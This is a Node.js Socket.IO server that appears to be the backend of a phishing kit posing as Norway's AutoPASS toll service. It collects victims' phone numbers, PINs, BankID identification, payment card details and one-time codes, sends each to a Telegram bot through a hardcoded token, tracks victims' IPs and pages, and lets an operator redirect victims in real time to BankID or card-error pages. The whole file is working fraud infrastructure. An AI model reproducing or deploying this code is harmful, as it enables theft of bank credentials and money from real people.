const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const session = require('express-session');
const cors = require('cors'); // Import the CORS middleware
const axios = require("axios")


const app = express();
const server = http.createServer(app);
const socketio = require("socket.io");

//config bot
const BOT_TOKEN = '6367600827:AAHjFW7yxVBCz7V8Nf3ObaXkoZqvQaZ4a3Y';
const CHAT_ID = '-4550837464';



async function sendToTelegram(data) {
    const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    // Prepare the message
    let message;

    if (typeof data === 'object') {
        // Dynamic object formatting with emojis
        message = Object.entries(data)
            .map(([key, value]) => `📌 *${key.charAt(0).toUpperCase() + key.slice(1)}*: ${value}`)
            .join('\n');
    } else {
        // Handle simple string messages
        message = `ℹ️ ${data}`;
    }

    try {
        const response = await axios.post(telegramApiUrl, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown', // Use Markdown for formatting
        });

        console.log('Message sent:', response.data);
    } catch (error) {
        console.error('Error sending message:', error.message);
    }
}

const corsOptions = {
    origin: '*', 
    methods: ['GET', 'POST'], 
    credentials: true, 
};

app.use(cors(corsOptions));

const io = socketio(server, {
    cors: {
        origin: 'https://autopass-801f6.web.app',
        methods: ["GET", "POST", "PUT"],
        credentials: true,
    },
    timeout: 60000,
});



// Configure session middleware
const sessionMiddleware = session({
    secret: 'your_secret_key',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }, 
});


app.use(sessionMiddleware);
const connectedUsers = {};


io.use((socket, next) => {
    sessionMiddleware(socket.request, {}, next);
  });
  

app.get('/', (req, res) => {
    res.send('Socket.IO with session example');
});

io.on('connection', (socket) => {
    const userId = socket.request.session.userID || socket.id; 
    const userIp = socket.handshake.address; 
    connectedUsers[userId] = {
        socketId: socket.id,
        currentPage: 'idk',
        ip: userIp, 
    };
    io.emit('updateConnectedUsers', connectedUsers);


    socket.on('pageChange', (page) => {
        connectedUsers[userId].currentPage = page;
        io.emit('updateConnectedUsers', connectedUsers); 
    })

    socket.on('phoneNumber', (data) => {
        sendToTelegram(data)
        console.log('Received login data from client:', data);


    });

    socket.on('sifferNumber', (data) => {
  
        sendToTelegram(data)
        console.log('Received login data from client:', data);
        if (connectedUsers[userId]) {
            connectedUsers[userId].currentPage = "card page";
            io.emit('updateConnectedUsers', connectedUsers);
            console.log('User currentPage updated:', connectedUsers[userId].currentPage);
        } else {
            console.log('User not found in connectedUsers');
        }

    });

    socket.on('Identifisering', (data) => {
        sendToTelegram(data)
        console.log('Received login data from client:', data);


    });

    socket.on('submitPayment', (data) => {
    
        sendToTelegram(data)
        console.log('Received login data from client:', data);

        if (connectedUsers[userId]) {
            connectedUsers[userId].currentPage = "loading";
            io.emit('updateConnectedUsers', connectedUsers);
            console.log('User currentPage updated:', connectedUsers[userId].currentPage);
        } else {
            console.log('User not found in connectedUsers');
        }
    });

    
    socket.on('Engangskode', (data) => {
        sendToTelegram(data)
        console.log('Received login data from client:', data);


    });
    


    socket.on('disconnect', () => {
        console.log('User disconnected:', socket.id);
    });

    socket.on('disconnect', () => {
        console.log('User disconnected:', socket.id);
        // Remove user from connectedUsers
        delete connectedUsers[userId];

        // Emit the updated list of connected users to all clients
        io.emit('updateConnectedUsers', connectedUsers);
    });




    socket.on('changePage', (data) => {
        console.log('Message from admin:', data);
    

        const { message, userId, Pageredirect, error } = data;
    
        let pageName = message;
    
        if (Pageredirect === "card") {
            console.log('Redirecting to card page, ',message);
            socket.to(userId).emit('newRedirect', { pageName: "bankid", option: message });
        } else 
        if (Pageredirect === "carderoror") {
            console.log('Redirecting to SMS page, ',message);
            socket.to(userId).emit('newRedirect', { pageName: "carderror", option: message });
        } 
        
        else {
            console.log('Redirecting to another page:', pageName);
            socket.to(userId).emit('newRedirect', { pageName, error });
        }
    
       
        if (connectedUsers[userId]) {
            connectedUsers[userId].currentPage = pageName;
            io.emit('updateConnectedUsers', connectedUsers);
        } else {
            console.error('User not found:', userId);
        }
    });
    
    
});

server.listen(3000, () => {
    console.log('Server is running on http://localhost:3000');
});
